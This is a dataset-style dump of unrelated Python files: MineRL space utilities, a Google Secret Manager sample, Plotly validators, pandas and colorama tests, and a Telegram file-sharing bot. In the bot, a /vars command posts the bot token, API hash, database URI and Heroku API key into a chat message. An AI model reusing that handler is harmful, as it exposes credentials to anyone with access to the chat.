    # Merge action/observation spaces from two environments
    hdls = hdls_1 + hdls_2
    hdl_dict = collections.defaultdict(list)
    _ = [hdl_dict[hdl.to_string()].append(hdl) for hdl in hdls]  # Join matching handlers
    merged_hdls = [reduce(lambda a, b: a | b, matching) for matching in hdl_dict.values()]

    return merged_hdls


# TODO: make a test.
# TODO: Maybe this should be based on handlers as above.
# E.g. 1. Intersect the handlers
# E.g. 2. We then do best effort clipping for spaces space.intersect
# wg note: whenever you write isinstance for a bunch of classes 
# you are being a fucing idiot this is exactly why we have object 
# oriented programming.
def intersect_space(space, sample):
    if isinstance(space, Dict):
        new_sample = collections.OrderedDict()
        for key, value in space.spaces.items():
            new_sample[key] = intersect_space(value, sample[key])
        return new_sample
    elif isinstance(space, Enum):
        if sample not in space:
            return space.default
        else:
            return sample
    else:
        # TODO: SUPPORT SPACE INTERSECTION.
        return sample


# TODO: make a test
def flatten_spaces(hdls: List[Handler]) -> Tuple[list, List[Tuple[str, MineRLSpace]]]:
    return [hdl.space.flattened for hdl in hdls if hdl.space.is_flattenable()], \
           [(hdl.to_string(), hdl.space) for hdl in hdls if
            not hdl.space.is_flattenable()]"
JD331	JD331-iam_revoke_access.py	"#!/usr/bin/env python

# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
""""""
command line application and sample code for revoking access to a secret.
""""""

import argparse


# [START secretmanager_iam_revoke_access]
def iam_revoke_access(project_id, secret_id, member):
    """"""
    Revoke the given member access to a secret.
    """"""

    # Import the Secret Manager client library.
    from google.cloud import secretmanager

    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret.
    name = client.secret_path(project_id, secret_id)

    # Get the current IAM policy.
    policy = client.get_iam_policy(request={""resource"": name})

    # Remove the given member's access permissions.
    accessRole = ""roles/secretmanager.secretAccessor""
    for b in list(policy.bindings):
        if b.role == accessRole and member in b.members:
            b.members.remove(member)

    # Update the IAM Policy.
    new_policy = client.set_iam_policy(request={""resource"": name, ""policy"": policy})

    # Print data about the secret.
    print(""Updated IAM policy on {}"".format(secret_id))
    # [END secretmanager_iam_revoke_access]

    return new_policy


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(""project_id"", help=""id of the GCP project"")
    parser.add_argument(""secret_id"", help=""id of the secret to get"")
    parser.add_argument(""member"", help=""member to revoke access"")
    args = parser.parse_args()

    iam_revoke_access(args.project_id, args.secret_id, args.member)"
JD298	JD298-main.py	"# Import Dependencies
import os
import csv

# File paths
budget_data_csv = os.path.join(""PyBank"",""Resources"", ""budget_data.csv"")
output_file = os.path.join(""PyBank"", ""analysis"", ""analysis.txt"")

# Initialize variables
total_months = 0
total_net = 0
profit_loss_list = []
change_list = []
greatest_incr = 0
greatest_decr = 0
incr_month = ''
decr_month = ''

# Open and read csv
with open(budget_data_csv) as csv_file:
    csv_reader = csv.reader(csv_file, delimiter="","")

    # Read the header and first row
    csv_header = next(csv_reader)
    first_row = next(csv_reader)
    
    # Update variables with entries from first row
    total_months += 1
    total_net += int(first_row[1])
    profit_loss_list.append(int(first_row[1]))
    greatest_incr = int(first_row[1])
    greatest_decr = int(first_row[1])

    # Read through each row of data after the first row and update variables
    for row in csv_reader:

        total_months += 1
        total_net += int(row[1])
        profit_loss_list.append(int(row[1]))
        if int(row[1]) > greatest_incr:
            incr_month = row[0]
            greatest_incr = int(row[1])
        if int(row[1]) < greatest_decr:
            decr_month = row[0]
            greatest_decr = int(row[1])

# Calculate changes in profit/loss from month to month
for i in range(len(profit_loss_list)-1):
    change_list.append(profit_loss_list[i+1] - profit_loss_list[i])

# Calculate average change
average_change = sum(change_list) / len(change_list)

# Create output string for analysis
output = (
    f""Financial Analysis\n""
    f""----------------------------\n""
    f""Total Months: {total_months}\n""
    f""Total: ${total_net}\n""
    f""Average Change: ${average_change:.2f}\n""
    f""Greatest Increase in Profits: {incr_month} (${greatest_incr})\n""
    f""Greatest Decrease in Profits: {decr_month} (${greatest_decr})"")

# Write to output txt file
with open(output_file, ""w"") as txtfile:
    writer = txtfile.write(output)"
JY534	JY534-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""sankey.node"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY200	JY200-_removal_sentinel.py	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

""""""
Used by visitors. This is hoisted into a separate module to avoid some circular
dependencies in the definition of CSTNode.
""""""

from enum import auto, Enum


class RemovalSentinel(Enum):
    """"""
    A :attr:`RemovalSentinel.REMOVE` value should be returned by a
    :meth:`CSTTransformer.on_leave` method when we want to remove that child from its
    parent. As a convenience, this can be constructed by calling
    :func:`libcst.RemoveFromParent`.

    The parent node should make a best-effort to remove the child, but may raise an
    exception when removing the child doesn't make sense, or could change the semantics
    in an unexpected way. For example, a function definition with no name doesn't make
    sense, but removing one of the arguments is valid.

    In we can't automatically remove the child, the developer should instead remove the
    child by constructing a new parent in the parent's :meth:`~CSTTransformer.on_leave`
    call.

    We use this instead of ``None`` to force developers to be explicit about deletions.
    Because ``None`` is the default return value for a function with no return
    statement, it would be too easy to accidentally delete nodes from the tree by
    forgetting to return a value.
    """"""

    REMOVE = auto()


def RemoveFromParent() -> RemovalSentinel:
    """"""
    A convenience method for requesting that this node be removed by its parent.
    Use this in place of returning :class:`RemovalSentinel` directly.
    For example, to remove all arguments unconditionally::

        def leave_Arg(
            self, original_node: cst.Arg, updated_node: cst.Arg
        ) -> Union[cst.Arg, cst.RemovalSentinel]:
            return RemoveFromParent()
    """"""
    return RemovalSentinel.REMOVE"
JD251	JD251-BaseOltAutomaton.py	"#
# Copyright 2017 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
from scapy.automaton import Automaton
from scapy.sendrecv import sendp
import structlog

log = structlog.get_logger()
_verbose = False

class BaseOltAutomaton(Automaton):

    comm = None
    retry = 3
    iface = None
    target = None
    verbose = None
    adaptor_agent = None
    device = None

    def parse_args(self, debug=0, store=0, **kwargs):
        self.comm = kwargs.pop('comm', None)
        self.target = kwargs.pop('target', None)
        self.device = kwargs.pop('device', None)
        Automaton.parse_args(self, debug=debug, store=store, **kwargs)
        self.verbose = kwargs.get('verbose', _verbose)
        self.iface = kwargs.get('iface', ""eth0"")

        if self.comm is None or self.target is None:
            raise ValueError(""Missing comm or target"")

    def my_send(self, pkt):
        sendp(pkt, iface=self.iface, verbose=self.verbose)

    def master_filter(self, pkt):
        """"""
        Anything coming from the OLT is for us
        :param pkt: incoming packet
        :return: True if it came from the olt
        """"""
        return pkt.src == self.target

    def debug(self, lvl, msg):
        if self.debug_level >= lvl:
            log.info(msg)

    def p(self, pkt, channel_id=-1, onu_id=-1, onu_session_id=-1):
        return self.comm.frame(pkt, channel_id=channel_id,
                               onu_id=onu_id, onu_session_id=onu_session_id)"
JD231	JD231-test_ops.py	"from datetime import datetime

from dateutil.tz import tzlocal
import pytest

from pandas.compat import IS64

from pandas import (
    DatetimeIndex,
    Index,
    bdate_range,
    date_range,
)
import pandas._testing as tm

START, END = datetime(2009, 1, 1), datetime(2010, 1, 1)


class TestDatetimeIndexOps:
    @pytest.mark.parametrize(
        ""freq,expected"",
        [
            (""A"", ""day""),
            (""Q"", ""day""),
            (""M"", ""day""),
            (""D"", ""day""),
            (""H"", ""hour""),
            (""T"", ""minute""),
            (""S"", ""second""),
            (""L"", ""millisecond""),
            (""U"", ""microsecond""),
        ],
    )
    def test_resolution(self, request, tz_naive_fixture, freq, expected):
        tz = tz_naive_fixture
        if freq == ""A"" and not IS64 and isinstance(tz, tzlocal):
            request.node.add_marker(
                pytest.mark.xfail(reason=""OverflowError inside tzlocal past 2038"")
            )

        idx = date_range(start=""2013-04-01"", periods=30, freq=freq, tz=tz)
        assert idx.resolution == expected

    def test_infer_freq(self, freq_sample):
        # GH 11018
        idx = date_range(""2011-01-01 09:00:00"", freq=freq_sample, periods=10)
        result = DatetimeIndex(idx.asi8, freq=""infer"")
        tm.assert_index_equal(idx, result)
        assert result.freq == freq_sample


@pytest.mark.parametrize(""freq"", [""B"", ""C""])
class TestBusinessDatetimeIndex:
    @pytest.fixture
    def rng(self, freq):
        return bdate_range(START, END, freq=freq)

    def test_comparison(self, rng):
        d = rng[10]

        comp = rng > d
        assert comp[11]
        assert not comp[9]

    def test_copy(self, rng):
        cp = rng.copy()
        repr(cp)
        tm.assert_index_equal(cp, rng)

    def test_identical(self, rng):
        t1 = rng.copy()
        t2 = rng.copy()
        assert t1.identical(t2)

        # name
        t1 = t1.rename(""foo"")
        assert t1.equals(t2)
        assert not t1.identical(t2)
        t2 = t2.rename(""foo"")
        assert t1.identical(t2)

        # freq
        t2v = Index(t2.values)
        assert t1.equals(t2v)
        assert not t1.identical(t2v)"
JD139	JD139-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""streamtube.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY541	JY541-test_pickle.py	"import unittest

from six.moves import cPickle as pickle

import isodate


class TestPickle(unittest.TestCase):
    '''
    A test case template to parse an ISO datetime string into a
    datetime object.
    '''

    def test_pickle_datetime(self):
        '''
        Parse an ISO datetime string and compare it to the expected value.
        '''
        dti = isodate.parse_datetime('2012-10-26T09:33+00:00')
        for proto in range(0, pickle.HIGHEST_PROTOCOL + 1):
            pikl = pickle.dumps(dti, proto)
            self.assertEqual(dti, pickle.loads(pikl),
                             ""pickle proto %d failed"" % proto)

    def test_pickle_duration(self):
        '''
        Pickle / unpickle duration objects.
        '''
        from isodate.duration import Duration
        dur = Duration()
        failed = []
        for proto in range(0, pickle.HIGHEST_PROTOCOL + 1):
            try:
                pikl = pickle.dumps(dur, proto)
                if dur != pickle.loads(pikl):
                    raise Exception(""not equal"")
            except Exception as e:
                failed.append(""pickle proto %d failed (%s)"" % (proto, repr(e)))
        self.assertEqual(len(failed), 0, ""pickle protos failed: %s"" %
                         str(failed))

    def test_pickle_utc(self):
        '''
        isodate.UTC objects remain the same after pickling.
        '''
        self.assertTrue(isodate.UTC is pickle.loads(pickle.dumps(isodate.UTC)))


def test_suite():
    '''
    Construct a TestSuite instance for all test cases.
    '''
    suite = unittest.TestSuite()
    suite.addTest(unittest.TestLoader().loadTestsFromTestCase(TestPickle))
    return suite


# load_tests Protocol
def load_tests(loader, tests, pattern):
    return test_suite()


if __name__ == '__main__':
    unittest.main(defaultTest='test_suite')"
JY64	JY64-isatty_test.py	"# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
import sys
from unittest import TestCase, main

from ..ansitowin32 import StreamWrapper, AnsiToWin32
from .utils import pycharm, replace_by, replace_original_by, StreamTTY, StreamNonTTY


def is_a_tty(stream):
    return StreamWrapper(stream, None).isatty()

class IsattyTest(TestCase):

    def test_TTY(self):
        tty = StreamTTY()
        self.assertTrue(is_a_tty(tty))
        with pycharm():
            self.assertTrue(is_a_tty(tty))

    def test_nonTTY(self):
        non_tty = StreamNonTTY()
        self.assertFalse(is_a_tty(non_tty))
        with pycharm():
            self.assertFalse(is_a_tty(non_tty))

    def test_withPycharm(self):
        with pycharm():
            self.assertTrue(is_a_tty(sys.stderr))
            self.assertTrue(is_a_tty(sys.stdout))

    def test_withPycharmTTYOverride(self):
        tty = StreamTTY()
        with pycharm(), replace_by(tty):
            self.assertTrue(is_a_tty(tty))

    def test_withPycharmNonTTYOverride(self):
        non_tty = StreamNonTTY()
        with pycharm(), replace_by(non_tty):
            self.assertFalse(is_a_tty(non_tty))

    def test_withPycharmNoneOverride(self):
        with pycharm():
            with replace_by(None), replace_original_by(None):
                self.assertFalse(is_a_tty(None))
                self.assertFalse(is_a_tty(StreamNonTTY()))
                self.assertTrue(is_a_tty(StreamTTY()))

    def test_withPycharmStreamWrapped(self):
        with pycharm():
            self.assertTrue(AnsiToWin32(StreamTTY()).stream.isatty())
            self.assertFalse(AnsiToWin32(StreamNonTTY()).stream.isatty())
            self.assertTrue(AnsiToWin32(sys.stdout).stream.isatty())
            self.assertTrue(AnsiToWin32(sys.stderr).stream.isatty())


if __name__ == '__main__':
    main()"
JY282	JY282-utils.py	"# Credits: @mrismanaziz
# FROM File-Sharing-Man <https://github.com/mrismanaziz/File-Sharing-Man/>
# t.me/SharingUserbot & t.me/Lunatic0de

import os

from bot import Bot
from config import (
    ADMINS,
    API_HASH,
    APP_ID,
    CHANNEL_ID,
    DB_URI,
    FORCE_MSG,
    FORCE_SUB_CHANNEL,
    FORCE_SUB_GROUP,
    HEROKU_API_KEY,
    HEROKU_APP_NAME,
    LOGGER,
    OWNER,
    PROTECT_CONTENT,
    START_MSG,
    TG_BOT_TOKEN,
)
from pyrogram import filters
from pyrogram.types import Message


@Bot.on_message(filters.command(""logs"") & filters.user(ADMINS))
async def get_bot_logs(client: Bot, m: Message):
    bot_log_path = ""logs.txt""
    if os.path.exists(bot_log_path):
        try:
            await m.reply_document(
                bot_log_path,
                quote=True,
                caption=""<b>Ini Logs Bot ini</b>"",
            )
        except Exception as e:
            os.remove(bot_log_path)
            LOGGER(__name__).warning(e)
    elif not os.path.exists(bot_log_path):
        await m.reply_text(""❌ <b>Tidak ada log yang ditemukan!</b>"")


@Bot.on_message(filters.command(""vars"") & filters.user(ADMINS))
async def varsFunc(client: Bot, message: Message):
    Man = await message.reply_text(""Tunggu Sebentar..."")
    text = f""""""<u><b>CONFIG VARS</b></u> @{client.username}
APP_ID = <code>{APP_ID}</code>
API_HASH = <code>{API_HASH}</code>
TG_BOT_TOKEN = <code>{TG_BOT_TOKEN}</code>
DATABASE_URL = <code>{DB_URI}</code>
OWNER = <code>{OWNER}</code>
ADMINS = <code>{ADMINS}</code>
    
<u><b>CUSTOM VARS</b></u>
CHANNEL_ID = <code>{CHANNEL_ID}</code>
FORCE_SUB_CHANNEL = <code>{FORCE_SUB_CHANNEL}</code>
FORCE_SUB_GROUP = <code>{FORCE_SUB_GROUP}</code>
PROTECT_CONTENT = <code>{PROTECT_CONTENT}</code>
START_MSG = <code>{START_MSG}</code>
FORCE_MSG = <code>{FORCE_MSG}</code>

<u><b>HEROKU CONFIGVARS</b></u>
HEROKU_APP_NAME = <code>{HEROKU_APP_NAME}</code>
HEROKU_API_KEY = <code>{HEROKU_API_KEY}</code>
    """"""
    await Man.edit_text(text)"
